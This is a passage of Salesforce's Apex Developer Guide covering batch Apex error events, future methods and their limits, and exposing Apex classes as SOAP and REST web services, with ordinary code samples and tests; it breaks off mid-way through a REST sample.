_Salesforce Help_ [: Define an External Data Source for Salesforce Connect—OData 2.0 or 4.0 Adapter](https://help.salesforce.com/articleView?id=platform_connect_add_external_data_source.htm&language=en_US)

###### Firing Platform Events from Batch Apex

Batch Apex classes can fire platform events when encountering an error or exception. Clients listening on an event can obtain actionable
information, such as how often the event failed and which records were in scope at the time of failure. Events are also fired for Salesforce
Platform internal errors and other uncatchable Apex exceptions such as LimitExceptions, which are caused by reaching governor limits.

An event message provides more granular error tracking than the Apex Jobs UI. It includes the record IDs being processed, exception
type, exception message, and stack trace. You can also incorporate custom handling and retry logic for failures. You can invoke custom
Apex logic from any trigger on this type of event, so Apex developers can build functionality like custom logging or automated retry
handling.

[For information on subscribing to platform events, see Subscribing to Platform Events.](https://developer.salesforce.com/docs/atlas.en-us.262.0.platform_events.meta/platform_events/platform_events_subscribe.htm)

The BatchApexErrorEvent object represents a platform event associated with a batch Apex class. This object is available in API version
44.0 and later. If the `start`, `execute`, or `finish` method of a batch Apex job encounters an unhandled exception, a
`BatchApexErrorEvent` [platform event is fired. For more details, see BatchApexErrorEvent in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.platform_events.meta/platform_events/sforce_api_objects_batchapexerrorevent.htm) _Platform Events Developer Guide_ .

To fire a platform event, a batch Apex class declaration must implement the Database.RaisesPlatformEvents interface.

```
   public with sharing class YourSampleBatchJob implements Database.Batchable<SObject>,

     Database.RaisesPlatformEvents {

     // class implementation

   }

```

Example: This example creates a trigger to determine which accounts failed in the batch transaction. Custom field Dirty__c
indicates that the account was one of a failing batch and ExceptionType__c indicates the exception that was encountered.
JobScope and ExceptionType are fields in the BatchApexErrorEvent object.

```
      trigger MarkDirtyIfFail on BatchApexErrorEvent (after insert) {

        Set<Id> asyncApexJobIds = new Set<Id>();

        for(BatchApexErrorEvent evt:Trigger.new){

           asyncApexJobIds.add(evt.AsyncApexJobId);

        }

        Map<Id,AsyncApexJob> jobs = new Map<Id,AsyncApexJob>(

           [SELECT id, ApexClass.Name FROM AsyncApexJob WHERE Id IN :asyncApexJobIds]

        );

```


Apex Developer Guide Invoking Apex

```
        List<Account> records = new List<Account>();

        for(BatchApexErrorEvent evt:Trigger.new){

           //only handle events for the job(s) we care about

           if(jobs.get(evt.AsyncApexJobId).ApexClass.Name == 'AccountUpdaterJob'){

             for (String item : evt.JobScope.split(',')) {

               Account a = new Account(

                  Id = (Id)item,

                  ExceptionType__c = evt.ExceptionType,

                  Dirty__c = true

               );

               records.add(a);

             }

           }

        }

        update records;

      }

```

Testing BatchApexErrorEvent Messages Published from Batch Apex Jobs

Use the `Test.getEventBus().deliver()` method to deliver event messages that are published by failed batch Apex jobs.
Use the `Test.startTest()` and `Test.stopTest()` statement block to execute the batch job.

This snippet shows how to execute a batch Apex job and deliver event messages. It executes the batch job after `Test.stopTest()` .
This batch job publishes a BatchApexErrorEvent message when a failure occurs through the implementation of
`Database.RaisesPlatformEvents` . After `Test.stopTest()` runs, a separate `Test.getEventBus().deliver()`
statement is added so that it can deliver the BatchApexErrorEvent.

```
   try {

      Test.startTest();

      Database.executeBatch(new SampleBatchApex());

      Test.stopTest();

      // Batch Apex job executes here

   } catch(Exception e) {

      // Catch any exceptions thrown in the batch job

   }

   // The batch job fires BatchApexErrorEvent if it fails, so deliver the event.

   Test.getEventBus().deliver();

```

Note: If further platform events are published by downstream processes, add `Test.getEventBus().deliver();` to
deliver the event messages for each process. For example, if a platform event trigger, which processes the event from the Apex
job, publishes another platform event, add a `Test.getEventBus().deliver();` statement to deliver the event message.

SEE ALSO:

_[Platform Events Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.platform_events.meta/platform_events/platform_events_test_deliver.htm)_ : Deliver Test Event Messages

_Platform Events Developer Guide_ [: Event and Event Bus Properties in Test Context](https://developer.salesforce.com/docs/atlas.en-us.262.0.platform_events.meta/platform_events/platform_events_test_events.htm)


Apex Developer Guide Invoking Apex

##### Future Methods

A future method runs asynchronously. You can call a future method to run long-running operations, such as callouts to external web
services or any operation that you want to run in its own thread. You can also use future methods to isolate Data Manipulation Language
(DML) operations on different sObject types to prevent the mixed DML error. Each future method is queued and runs when system
resources become available. That way, the execution of your code doesn’t wait for the completion of a long-running operation. A benefit
of future methods is that some governor limits are higher, such as SOQL query limits and heap size limits.

Important: Salesforce now recommends that you use Queueable Apex instead of Apex future methods. Queueables have the
same use cases as future methods but offer more benefits, including job IDs, support for non-primitive types, and job chaining.

See Queueable Apex.

##### To define a future method, annotate it with the Future annotation.

```
   public with sharing class FutureClass {

      @Future

      public static void myFutureMethod()

      {

         // Perform some operations

      }

   }

##### Methods with the Future annotation must be static methods, and can only return a void type. The specified parameters must be primitive data types, arrays of primitive data types, or collections of primitive data types. Methods with the Future annotation can’t
```

take sObjects or objects as arguments.

The reason why sObjects can’t be passed as arguments to future methods is because the sObject can change between the time that
you call the method and the time that it executes. In this case, the future method gets the old sObject values and can overwrite them.
To work with sObjects that already exist in the database, pass the sObject ID or the collection of IDs instead. Then use the ID to perform
a query for the most up-to-date record. This example shows how to do so with a list of IDs.

```
   public with sharing class FutureMethodRecordProcessing {

      @Future

      public static void processRecords(List<ID> recordIds)

      {

         // Get those records based on the IDs

         List<Account> accts = [SELECT Name FROM Account WHERE Id IN :recordIds WITH

   USER_MODE];

         // Process records

      }

   }

```

Here’s a skeletal example of a future method that makes a callout to an external service. Notice that the annotation takes an extra
parameter ( `callout=true` ) to indicate that callouts are allowed. To learn more about callouts, see Invoking Callouts Using Apex.

```
   public with sharing class FutureMethodExample {

      @Future(callout=true)

      public static void getStockQuotes(String acctName)

      {

         // Perform a callout to an external service

      }

   }

```

Insert a user with a non-null role in a separate thread from DML operations on other sObjects. In this example, the future method,
`insertUserWithRole`, which is defined in the `Util` class, performs the insertion of a user with the COO role. This future method


Apex Developer Guide Invoking Apex

requires the COO role to be defined in the org. The `useFutureMethod` method in `MixedDMLFuture` inserts an account and
calls the future method `insertUserWithRole` .

This `Util` class contains the future method for inserting a user with a non-null role.

```
   public with sharing class Util {

      @Future

      public static void insertUserWithRole(

        String uname, String al, String em, String lname) {

        Profile p = [SELECT Id FROM Profile WHERE Name='Standard User' WITH USER_MODE];

        UserRole r = [SELECT Id FROM UserRole WHERE Name='COO' WITH USER_MODE];

        // Create new user with a non-null user role ID

        User newUser = new User(alias = al, email=em,

           emailencodingkey='UTF-8', lastname=lname,

           languagelocalekey='en_US',

           localesidkey='en_US', profileid = p.Id, userroleid = r.Id,

           timezonesidkey='America/Los_Angeles',

           username=uname);

        insert as user newUser;

      }

   }

```

This class contains the main method that calls the future method.

```
   public with sharing class MixedDMLFuture {

      public static void useFutureMethod() {

        // First DML operation

        Account a = new Account(Name='Acme');

        insert as user a;

        // This next operation (insert a user with a role)

        // can't be mixed with the previous insert unless

        // it is within a future method.

        // Call future method to insert a user with a role.

        Util.insertUserWithRole(

           'mruiz@awcomputing.com', 'mruiz',

           'mruiz@awcomputing.com', 'Ruiz');

      }

   }

```

You can invoke future methods the same way that you invoke any other method. However, a future method can’t invoke another future
method.

Future Method Limits

Methods with the `Future` annotation have these limits.

**•** No more than 0 in batch and future contexts; 50 in queueable context method calls per Apex invocation. Asynchronous calls, such
as `Future` or `executeBatch`, that are called in a `startTest` or `stopTest` block don’t count against your limits for the
number of queued jobs.

Note: Having multiple future methods fan out from a queueable job isn’t a recommended practice as it can rapidly add many
future methods to the asynchronous queue. Request processing can be delayed and you can quickly hit the daily maximum
[limit for asynchronous Apex method executions. See Future Method Performance Best Practices and Lightning Platform Apex](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_invoking_future_methods.htm)
[Limits.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_gov_limits.htm#in_topic_non_transactional_gov_limits_section)


Apex Developer Guide Invoking Apex

**•** The maximum number of `Future` method invocations per a 24-hour period is 250,000 or the number of user licenses in your
organization multiplied by 200, whichever is greater. This limit is for your entire org and is shared with all asynchronous Apex: Batch
Apex, Queueable Apex, scheduled Apex, and future methods. To check how many asynchronous Apex executions are available,
make a request to REST API `limits` [resource. See List Organization Limits in the REST API Developer Guide. If the number of](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/dome_limits.htm)
asynchronous Apex executions needed by a job exceeds the available number that’s calculated by using the 24-hour rolling limit,
an exception is thrown. For example, if your async job requires 10,000 method executions and the available 24-hour rolling limit is
9,500, you get the AsyncApexExecutions Limit exceeded exception. The license types that count toward this limit include full
Salesforce and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company
Communities users.

**•** The execution of a queued job counts one time against the shared limit for asynchronous Apex method executions. See [Salesforce](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_gov_limits.htm)
[Platform Apex Limits.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_gov_limits.htm)

**•** You can process queueable jobs that exceed the daily shared limit for asynchronous Apex executions at a throttled rate. See Elastic
Limits for Asynchronous Apex Executions (Beta) on page 358.

Note:

**•** Future jobs queued by a transaction aren’t processed if the transaction rolls back.

**•** Future method jobs queued before a Salesforce service maintenance downtime remain in the queue. After service downtime
ends and when system resources become available, the queued future method jobs are executed. If a future method was
running when downtime occurred, the future method execution is rolled back and restarted after the service comes back up.

Testing Future Methods

To test methods defined with the `Future` [annotation, call the class containing the method in a startTest(), stopTest() code block. All](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_test.htm#apex_System_Test_startTest)
asynchronous calls made after the `startTest` method are collected by the system. When `stopTest` is executed, all asynchronous
processes are run synchronously.

For our example, here’s the test class.

```
   @IsTest

   private class MixedDMLFutureTest {

      @IsTest static void test1() {

        User thisUser = [SELECT Id FROM User WHERE Id = :UserInfo.getUserId() WITH

   USER_MODE];

        // System.runAs() allows mixed DML operations in test context

        System.runAs(thisUser) {

           // startTest/stopTest block to run future method synchronously

           Test.startTest();

           MixedDMLFuture.useFutureMethod();

           Test.stopTest();

        }

        // The future method will run after Test.stopTest();

        // Verify account is inserted

        Account[] accts = [SELECT Id from Account WHERE Name='Acme' WITH USER_MODE];

        Assert.areEqual(1, accts.size());

        // Verify user is inserted

        List<User> users = [SELECT Id from User WHERE username='mruiz@awcomputing.com'

   WITH USER_MODE];

        Assert.areEqual(1, users.size());

      }

   }

```


Apex Developer Guide Invoking Apex

Future Method Performance Best Practices

Salesforce uses a queue-based framework to handle asynchronous processes from such sources as future methods and batch Apex. This
queue is used to balance request workload across organizations.To ensure that your organization is efficiently using the queue for your
asynchronous processes:

**•** Avoid adding large numbers of future methods to the asynchronous queue, if possible. If more than 2,000 unprocessed requests
from a single organization are in the queue, any additional requests from the same organization will be delayed while the queue
handles requests from other organizations.

**•** Make sure that future methods run as fast as possible. To ensure fast execution of batch jobs, minimize web service callout times
and tune queries used in your future methods. The longerthe future method runs, the more likely other queued requests are delayed
when there are many requests in the queue.

**•** Test your future methods at scale. To help determine if delays can occur, test by using an environment that generates the maximum
number of future methods that you expect to handle.

**•** Consider using batch Apex instead of future methods to process large numbers of records.

#### Exposing Apex Methods as SOAP Web Services

You can expose your Apex methods as SOAP web services so that external applications can access your code and your application.

To expose your Apex methods, use Webservice Methods.

Tip:

**•** Apex SOAP web services allow an external application to invoke Apex methods through SOAP Web services. Apex callouts
enable Apex to invoke external web or HTTP services.

**•** Apex REST API exposes your Apex classes and methods as REST web services. See Exposing Apex Classes as REST Web Services.

##### Webservice Methods

Exposing Data with Webservice Methods

Considerations for Using the webservice Keyword

Overloading Web Service Methods

##### Webservice Methods

Apex class methods can be exposed as custom SOAP Web service calls. This allows an external application to invoke an Apex Web service
to perform an action in Salesforce. Use the `webservice` keyword to define these methods. For example:

```
   global class MyWebService {

      webservice static Id makeContact(String contactLastName, Account a) {

        Contact c = new Contact(lastName = contactLastName, AccountId = a.Id);

        insert c;

        return c.id;

      }

   }

```

A developer of an external application can integrate with an Apex class containing `webservice` methods by generating a WSDL for
the class. To generate a WSDL from an Apex class detail page:

**1.** In the application from Setup, enter “Apex Classes” in the `Quick Find` box, then select **Apex Classes** .

**2.** Click the name of a class that contains `webservice` methods.


Apex Developer Guide Invoking Apex

**3.** Click **Generate WSDL** .

##### Exposing Data with Webservice Methods

Invoking a custom `webservice` method always uses system context. Consequently, the current user's credentials are not used, and
any user who has access to these methods can use their full power, regardless of permissions, field-level security, or sharing rules.
Developers who expose methods with the `webservice` keyword should therefore take care that they are not inadvertently exposing
any sensitive data.

Warning: Apex class methods that are exposed through the API with the `webservice` keyword don't enforce object permissions
and field-level security by default. We recommend that you make use of the appropriate object or field describe result methods
[to check the current user’s access level on the objects and fields that the webservice method is accessing. See DescribeSObjectResult](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
[Class and DescribeFieldResult Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

Also, sharing rules (record-level access) are enforced only when declaring a class with the `with sharing` keyword. This
requirement applies to all Apex classes, including to classes that contain webservice methods. To enforce sharing rules for webservice
methods, declare the class that contains these methods with the `with sharing` keyword. See Use the with sharing, without
sharing, and inherited sharing Keywords.

##### Considerations for Using the webservice Keyword

When using the `webservice` keyword, keep the following considerations in mind:

**•** Use the `webservice` keyword to define top-level methods and outer class methods. You can’t use the `webservice` keyword
to define a class or an inner class method.

**•** You cannot use the `webservice` keyword to define an interface, or to define an interface's methods and variables.

**•** System-defined enums cannot be used in Web service methods.

**•** You cannot use the `webservice` keyword in a trigger.

**•** All classes that contain methods defined with the `webservice` keyword must be declared as `global` . If a method or inner
class is declared as `global`, the outer, top-level class must also be defined as `global` .

**•** Methods defined with the `webservice` keyword are inherently global. Any Apex code that has access to the class can use these
methods. You can consider the `webservice` keyword as a type of access modifier that enables more access than `global` .

**•** Define any method that uses the `webservice` keyword as `static` .

**•** You cannot deprecate `webservice` methods or variables in managed package code.

**•** Because there are no SOAP analogs for certain Apex elements, methods defined with the `webservice` keyword cannot take the
following elements as parameters. While these elements can be used within the method, they also cannot be marked as return
values.

**–** Maps

**–** Sets

**–** Pattern objects

**–** Matcher objects

**–** Exception objects

**•** Use the `webservice` keyword with any member variables that you want to expose as part of a Web service. Do not mark these
member variables as `static` .

Considerations for calling Apex SOAP Web service methods:


Apex Developer Guide Invoking Apex

**•** Salesforce denies access to Web service and `executeanonymous` requests from an AppExchange package that has
`Restricted` access.

**•** Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String value
that is too long for the field.

**•** If a login call is made from the API for a user with an expired or temporary password, subsequent API calls to custom Apex SOAP
Web service methods aren't supported and result in the INVALID_OPERATION_WITH_EXPIRED_PASSWORD error. Reset the user's
password and make a call with an unexpired password to be able to call Apex Web service methods.

The following example shows a class with Web service member variables and a Web service method:

```
   global class SpecialAccounts {

     global class AccountInfo {

      webservice String AcctName;

      webservice Integer AcctNumber;

     }

     webservice static Account createAccount(AccountInfo info) {

      Account acct = new Account();

      acct.Name = info.AcctName;

      acct.AccountNumber = String.valueOf(info.AcctNumber);

      insert acct;

      return acct;

     }

     webservice static Id [] createAccounts(Account parent,

        Account child, Account grandChild) {

        insert parent;

        child.parentId = parent.Id;

        insert child;

        grandChild.parentId = child.Id;

        insert grandChild;

        Id [] results = new Id[3];

        results[0] = parent.Id;

        results[1] = child.Id;

        results[2] = grandChild.Id;

        return results;

      }

   }

   // Test class for the previous class.

   @isTest

   private class SpecialAccountsTest {

     testMethod static void testAccountCreate() {

      SpecialAccounts.AccountInfo info = new SpecialAccounts.AccountInfo();

      info.AcctName = 'Manoj Cheenath';

      info.AcctNumber = 12345;

      Account acct = SpecialAccounts.createAccount(info);

      System.assert(acct != null);

     }

   }

```

You can invoke this Web service using AJAX. For more information, see Apex in AJAX on page 346.


Apex Developer Guide Invoking Apex

##### Overloading Web Service Methods

SOAP and WSDL do not provide good support for overloading methods. Consequently, Apex does not allow two methods marked with
the `webservice` keyword to have the same name. Web service methods that have the same name in the same class generate a
compile-time error.

#### Exposing Apex Classes as REST Web Services

You can expose your Apex classes and methods so that external applications can access your code and your application through the
REST architecture.

This is an overview of how to expose your Apex classes as REST web services. You'll learn about the class and method annotations and
see code samples that show you how to implement this functionality.

Tip: Apex SOAP web services allow an external application to invoke Apex methods through SOAP web services. See Exposing
Apex Methods as SOAP Web Services.

##### Introduction to Apex REST

Apex REST Annotations

Apex REST Methods

Exposing Data with Apex REST Web Service Methods
Custom Apex REST web service methods run in user mode by default. In user mode, the current user’s object permissions, field-level
security, and sharing rules are enforced.

Apex REST Code Samples

##### Introduction to Apex REST

You can expose your Apex class and methods so that external applications can access your code and your application through the REST
architecture. This is done by defining your Apex class with the `@RestResource` annotation to expose it as a REST resource. Similarly,
add annotations to your methods to expose them through REST. For example, you can add the `@HttpGet` annotation to your method
to expose it as a REST resource that can be called by an HTTP `GET` request. For more information, see Apex REST Annotations on page

These are the classes containing methods and properties you can use with Apex REST.

**Class** **Description**

[RestContext Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_restcontext.htm) Contains the `RestRequest` and `RestResponse` objects.

`[request](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_restcontext.htm)` Use the `System.RestRequest` class to access and pass
request data in a RESTful Apex method.

`[response](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_restcontext.htm)` Represents an object used to pass data from an Apex RESTful Web
service method to an HTTP response.

Governor Limits

Calls to Apex REST classes count against the organization's API governor limits. All standard Apex governor limits apply to Apex REST
classes. For example, the maximum request or response size is 6 MB for synchronous Apex or 12 MB for asynchronous Apex. For more
information, see Execution Governors and Limits.


Apex Developer Guide Invoking Apex

Authentication

Apex REST supports these authentication mechanisms:

**•** OAuth 2.0

**•** Session ID

See _[Step Two: Set Up Authorization](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/quickstart_oauth.htm)_ in the _REST API Developer Guide_ .

##### Apex REST Annotations

Use these annotations to expose an Apex class as a RESTful Web service.

**•** `@ReadOnly`

**•** `@RestResource(urlMapping='/` _**`yourUrl`**_ `')`

**•** `@HttpDelete`

**•** `@HttpGet`

**•** `@HttpPatch`

**•** `@HttpPost`

**•** `@HttpPut`

##### Apex REST Methods

Apex REST supports two formats for representations of resources: JSON and XML. JSON representations are passed by default in the
body of a request or response, and the format is indicated by the `Content-Type` property in the HTTP header. You can retrieve the
body as a Blob from the HttpRequest object if there are no parameters to the Apex method. If parameters are defined in the Apex method,
an attempt is made to deserialize the request body into those parameters. If the Apex method has a non-void return type, the resource
representation is serialized into the response body.

These return and parameter types are allowed:

**•** Apex primitives (excluding sObject and Blob).

**•** sObjects

**•** Lists or maps of Apex primitives or sObjects (only maps with String keys are supported).

**•** User-defined types that contain member variables of the types listed above.

Note: Apex REST doesn’t support XML serialization and deserialization of Connect in Apex objects. Apex REST does support JSON
serialization and deserialization of Connect in Apex objects. Also, some collection types, such as maps and lists, aren’t supported
with XML. See Request and Response Data Considerations for details.

Methods annotated with `@HttpGet` or `@HttpDelete` must have no parameters. This is because GET and DELETE requests have
no request body, so there's nothing to deserialize.

The @ReadOnly annotation supports the Apex REST annotations for all the HTTP requests: `@HttpDelete`, `@HttpGet`, `@HttpPatch`,

`@HttpPost`, and `@HttpPut` .

A single Apex class annotated with `@RestResource` can't have multiple methods annotated with the same HTTP request method.
For example, the same class can't have two methods annotated with `@HttpGet` .

Note: Apex REST currently doesn't support requests of Content-Type `multipart/form-data` .


Apex Developer Guide Invoking Apex

Apex REST Method Considerations

Here are a few points to consider when you define Apex REST methods.

**•** `RestRequest` and `RestResponse` objects are available by default in your Apex methods through the static `RestContext`
object. This example shows how to access these objects through `RestContext` :

```
     RestRequest req = RestContext.request;

     RestResponse res = RestContext.response;

```

**•** If the Apex method has no parameters, Apex REST copies the HTTP request body into the `RestRequest.requestBody`
property. If the method has parameters, then Apex REST attempts to deserialize the data into those parameters and the data won't
be deserialized into the `RestRequest.requestBody` property.

**•** Apex REST uses similar serialization logic for the response. An Apex method with a non-void return type has the return value serialized
into `RestResponse.responseBody` . If the return type includes fields with null values, those fields aren’t serialized into the
response body.

**•** Apex REST methods can be used in managed and unmanaged packages. When calling Apex REST methods that are contained in a
managed package, you must include the managed package namespace in the REST call URL. For example, if the class is contained
in a managed package namespace called `packageNamespace` and the Apex REST methods use a URL mapping of
`/MyMethod/*`, the URL used via REST to call these methods would be of the form
`https://` _`instance`_ `.salesforce.com/services/apexrest/packageNamespace/MyMethod/` . For more
information about managed packages, see What is a Package?.

**•** If a login call is made from the API for a user with an expired or temporary password, subsequent API calls to custom Apex REST Web
service methods aren't supported and result in the MUTUAL_AUTHENTICATION_FAILED error. Reset the user's password and make
a call with an unexpired password to be able to call Apex Web service methods.

**•** If the heap limit is exceeded in the process of serialization, an `HTTP 200` code is returned and the error `{"status":"some`
`error occurred"}` is appended to the partial JSON response. Returning a collection of sObjects from a REST method involves
buffering the JSON serialized form of each sObject. Heap and CPU limits may not be encountered until after the HTTP response
header and initial data has started streaming back to the client. To gain control of the statusCode and the `responseBody`, use
a `RestResponse` instead of directly returning sObjects.

User-Defined Types

You can use user-defined types for parameters in your Apex REST methods. Apex REST deserializes request data into `public`, `private`,
or `global` class member variables of the user-defined type, unless the variable is declared as `static` or `transient` . For example,
an Apex REST method that contains a user-defined type parameter might look like the following:

```
   @RestResource(urlMapping='/user_defined_type_example/*')

   global with sharing class MyOwnTypeRestResource {

      @HttpPost

      global static MyUserDefinedClass echoMyType(MyUserDefinedClass ic) {

        return ic;

      }

      global class MyUserDefinedClass {

        global String string1;

        global String string2 { get; set; }

        private String privateString;

        global transient String transientString;

```


Apex Developer Guide Invoking Apex

```
      }

   }

```

Valid JSON and XML request data for this method would look like:

```
   {

      "ic" : {

             "string1" : "value for string1",

             "string2" : "value for string2",

             "privateString" : "value for privateString"

           }

   }

   <request>

      <ic>

        <string1>value for string1</string1>

        <string2>value for string2</string2>

        <privateString>value for privateString</privateString>

      </ic>

   </request>

```

The `public`, `private`, or `global` class member variables must be types allowed by Apex REST:

**•** Apex primitives (excluding sObject and Blob).

**•** sObjects

**•** Lists or maps of Apex primitives or sObjects (only maps with String keys are supported).

When creating user-defined types used as Apex REST method parameters, avoid introducing any class member variable definitions that
result in cycles (definitions that depend on each other) at run time in your user-defined types. Here's a simple example:

```
   @RestResource(urlMapping='/CycleExample/*')

   global with sharing class ApexRESTCycleExample {

      @HttpGet

      global static MyUserDef1 doCycleTest() {

        MyUserDef1 def1 = new MyUserDef1();

        MyUserDef2 def2 = new MyUserDef2();

        def1.userDef2 = def2;

        def2.userDef1 = def1;

        return def1;

      }

      global class MyUserDef1 {

        MyUserDef2 userDef2;

      }

      global class MyUserDef2 {

        MyUserDef1 userDef1;

      }

   }

```

The code in the previous example compiles, but at run time when a request is made, Apex REST detects a cycle between instances of
`def1` and `def2`, and generates an HTTP 400 status code error response.


Apex Developer Guide Invoking Apex

Request and Response Data Considerations

Some additional things to keep in mind for the request data for your Apex REST methods:

**•** The names of the Apex parameters matter, although the order doesn’t. For example, valid requests in both XML and JSON look like
the following:

```
     @HttpPost

     global static void myPostMethod(String s1, Integer i1, Boolean b1, String s2)

     {

      "s1" : "my first string",

      "i1" : 123,

      "s2" : "my second string",

      "b1" : false

     }

     <request>

      <s1>my first string</s1>

      <i1>123</i1>

      <s2>my second string</s2>

      <b1>false</b1>

     </request>

```

**•** The URL patterns _`URLpattern`_ and _`URLpattern`_ /* match the same URL. If one class has a `urlMapping` of _`URLpattern`_
and another class has a `urlMapping` of _`URLpattern`_ /*, a REST request for this URL pattern resolves to the class that was saved
first.

**•** Some parameter and return types can't be used with XML as the Content-Type for the request or as the accepted format for the
response, and hence, methods with these parameter or return types can't be used with XML. Lists, maps, or collections of collections,
for example, `List<List<String>>` aren't supported. However, you can use these types with JSON. If the parameter list
includes a type that's invalid for XML and XML is sent, an HTTP 415 status code is returned. If the return type is a type that's invalid
for XML and XML is the requested response format, an HTTP 406 status code is returned.

**•** For request data in either JSON or XML, valid values for Boolean parameters are: `true`, `false` (both are treated as case-insensitive),
`1` and `0` (the numeric values, not strings of “1” or “0”). Any other values for Boolean parameters result in an error.

**•** If the JSON or XML request data contains multiple parameters of the same name, this results in an HTTP 400 status code error response.
For example, if your method specifies an input parameter named `x`, the following JSON request data results in an error:

```
     {

       "x" : "value1",

       "x" : "value2"

     }

```

Similarly, for user-defined types, if the request data includes data for the same user-defined type member variable multiple times,
this results in an error. For example, given this Apex REST method and user-defined type:

```
     @RestResource(urlMapping='/DuplicateParamsExample/*')

     global with sharing class ApexRESTDuplicateParamsExample {

       @HttpPost

       global static MyUserDef1 doDuplicateParamsTest(MyUserDef1 def) {

          return def;

       }

       global class MyUserDef1 {

```


Apex Developer Guide Invoking Apex

```
          Integer i;

       }

     }

```

The following JSON request data also results in an error:

```
     {

       "def" : {

             "i" : 1,

             "i" : 2

            }

     }

```

**•** If you must specify a null value for one of your parameters in your request data, you can either omit the parameter entirely or specify
a null value. In JSON, you can specify `null` as the value. In XML, you must use the
`http://www.w3.org/2001/XMLSchema-instance` namespace with a nil value.

**•** For XML request data, you must specify an XML namespace that references any Apex namespace your method uses. So, for example,
if you define an Apex REST method such as:

```
     @RestResource(urlMapping='/namespaceExample/*')

     global class MyNamespaceTest {

       @HttpPost

       global static MyUDT echoTest(MyUDT def, String extraString) {

          return def;

       }

       global class MyUDT {

          Integer count;

       }

     }

```

You can use the following XML request data:

```
     <request>

      <def xmlns:MyUDT="http://soap.sforce.com/schemas/class/MyNamespaceTest">

       <MyUDT:count>23</MyUDT:count>

      </def>

      <extraString>test</extraString>

     </request>

```

Response Status Codes

The status code of a response is set automatically. This table lists some HTTP status codes and what they mean in the context of the
HTTP request method. For the full list of response status codes, see `[statusCode](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_restresponse.htm#apex_System_RestResponse_statusCode)` .

**Request Method** **Response Status** **Description**
**Code**

GET 200 The request was successful.

PATCH 200 The request was successful and the return type is non-void.

PATCH 204 The request was successful and the return type is void.


Apex Developer Guide Invoking Apex

**Request Method** **Response Status** **Description**
**Code**

DELETE, GET, PATCH, POST, PUT 400 An unhandled user exception occurred.

DELETE, GET, PATCH, POST, PUT 403 You don't have access to the specified Apex class.

DELETE, GET, PATCH, POST, PUT 404 The URL is unmapped in an existing `@RestResource`
annotation.

DELETE, GET, PATCH, POST, PUT 404 The URL extension is unsupported.

DELETE, GET, PATCH, POST, PUT 404 The Apex class with the specified namespace couldn't be found.

DELETE, GET, PATCH, POST, PUT 405 The request method doesn't have a corresponding Apex method.

DELETE, GET, PATCH, POST, PUT 406 The Content-Type property in the header was set to a value other
than JSON or XML.

DELETE, GET, PATCH, POST, PUT 406 The header specified in the HTTP request isn’t supported.

GET, PATCH, POST, PUT 406 The XML return type specified for format is unsupported.

DELETE, GET, PATCH, POST, PUT 415 The XML parameter type is unsupported.

DELETE, GET, PATCH, POST, PUT 415 The Content-Header Type specified in the HTTP request header
is unsupported.

DELETE, GET, PATCH, POST, PUT 500 An unhandled Apex exception occurred.

SEE ALSO:

JSON Support

XML Support

##### Exposing Data with Apex REST Web Service Methods

Custom Apex REST web service methods run in user mode by default. In user mode, the current user’s object permissions, field-level
security, and sharing rules are enforced.

To bypass object or field-level security while using SOQL SELECT statements in Apex, you must use the `WITH SYSTEM_MODE` clause.

You can also use the appropriate object or field describe result methods to check the current user’s access level on the objects and fields
[that the Apex REST API method is accessing. See DescribeSObjectResult Class and DescribeFieldResult Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

Sharing rules, record-level access are also enforced by default. To bypass sharing rules for Apex REST API methods, you must explicitly
declare the class that contains these methods with the `without sharing` keyword. See Using the `with sharing` or `without`
`sharing` Keywords.

Versioned Behavior Changes

In API version 67.0 and later, Apex runs in user context by default, which means that the current user’s object permissions and field-level
security (FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default, which means that the
current user’s object permissions and FLS settings are ignored.


Apex Developer Guide Invoking Apex

In API version 67.0 and later, classes without an explicit sharing declaration run in `with sharing` mode. In API version 66.0 and
earlier, the default sharing mode of classes without an explicit sharing declaration is `without sharing` .

SEE ALSO:

Apex Security and Sharing Model

##### Apex REST Code Samples

These code samples show you how to expose Apex classes and methods through the REST architecture and how to call those resources
from a client.

###### Apex REST Basic Code Sample

This sample shows how to implement a simple REST API in Apex with three HTTP request methods to delete, retrieve, and update
a record.

Apex REST Code Sample Using RestRequest
This sample shows you how to add an attachment to a record by using the RestRequest object.

###### Apex REST Basic Code Sample

This sample shows how to implement a simple REST API in Apex with three HTTP request methods to delete, retrieve, and update a
record.

For more information about authenticating with `cURL` [, see the Quick Start section of the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/quickstart.htm) _REST API Developer Guide_ .

**1.** Create an Apex class in your instance from Setup. Enter _`Apex Classes`_ in the `Quick Find` box, select **Apex Classes**, and
then click **New** . Add this code to the new Apex class:

```
     @RestResource(urlMapping='/Account/*')

     global with sharing class MyRestResource {

       @HttpDelete

       global static void doDelete() {

          RestRequest req = RestContext.request;

          RestResponse res = RestContext.response;

         String accountId = req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);

          Account account = [SELECT Id FROM Account WHERE Id = :accountId];

          delete account;

       }

       @HttpGet

       global static Account doGet() {

          RestRequest req = RestContext.request;

          RestResponse res = RestContext.response;

